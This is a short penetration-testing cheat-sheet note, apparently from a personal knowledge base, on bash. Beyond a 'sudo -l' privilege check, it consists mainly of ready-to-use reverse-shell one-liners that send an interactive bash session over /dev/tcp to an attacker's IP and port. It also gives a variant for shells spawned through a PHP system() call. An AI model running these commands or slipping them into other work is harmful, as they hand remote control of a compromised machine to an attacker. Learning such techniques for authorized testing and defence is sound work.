**Tags:** #type/tool
**Link:** 
**Purpose:** 

---
# Info

# Usage
`sudo -l` list sudo privileges of the current user
# Snippets
#### Simple Reverse Shell
`bash -i >& /dev/tcp/192.168.x.x/4444 0>&1`
If you create shell using e.g. a php system() call it might happen, that `sh` is used per default - in that case, first start a full bash process and then start the reverse shell inside that bash process: `bash -c "bash -i >& /dev/tcp/192.168.x.x/4444 0>&1"`
